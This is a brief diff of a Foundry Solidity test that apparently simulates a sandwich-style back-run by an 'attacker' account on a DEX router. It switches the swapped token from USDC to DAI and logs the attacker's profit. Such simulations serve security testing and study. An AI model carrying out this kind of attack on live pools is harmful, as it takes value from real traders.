@@ -274,7 +274,7 @@ contract ContractTest is Test {
         vm.startPrank(attacker);
         router.swapExactTokensForTokens(
             address(eth),
-            address(usdc),
+            address(dai),
             eth.balanceOf(address(attacker)),
             0,
             attacker,
@@ -282,7 +282,7 @@ contract ContractTest is Test {
         );
 
         console.log("after back run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
-        console.log("after back run attacker usdc", usdc.balanceOf(address(attacker)) / 1e6);
-        console.log("profit: ", usdc.balanceOf(address(attacker)) / 1e6 - 200000);
+        console.log("after back run attacker dai", dai.balanceOf(address(attacker)) / 1e18);
+        console.log("profit: ", dai.balanceOf(address(attacker)) / 1e18 - 200_000);
     }
 }
